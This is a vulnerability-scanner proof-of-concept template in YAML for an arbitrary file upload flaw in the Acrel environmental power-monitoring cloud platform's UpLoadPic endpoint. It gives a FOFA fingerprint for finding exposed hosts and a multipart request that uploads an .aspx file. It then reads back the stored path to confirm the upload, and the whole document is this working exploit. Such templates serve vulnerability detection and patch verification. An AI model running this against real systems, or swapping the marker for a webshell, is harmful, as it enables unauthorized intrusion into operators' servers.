id: poc-yaml-acreldny-uploadpic-anyfile-upload
info:
  name: 安科瑞环保用电监管云平台 UpLoadPic 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 安科瑞环保用电监管云平台
  fofa: body="myCss/phone.css"
variables:
  t1: random_str(5)
  t2: base64(t1)
requests:
- method: POST
  path: /Enterprise/UpLoadPic
  headers:
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRDazwgc1RnTaskmR
  data: '------WebKitFormBoundaryRDazwgc1RnTaskmR

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"


    {{.t2}}

    ------WebKitFormBoundaryRDazwgc1RnTaskmR--'
  expression: status_code == 200 && contains(body,"\"status\":true") && contains(body,".aspx")
    && !contains(body,"<")
  output:
  - regex_match(body,"/UpLoad/Temp/(?P<file>[0-9a-z]{32}).aspx")
- method: GET
  path: /UpLoad/Temp/{{.file}}.aspx
  expression: status_code == 200 && body == t2
transport: http
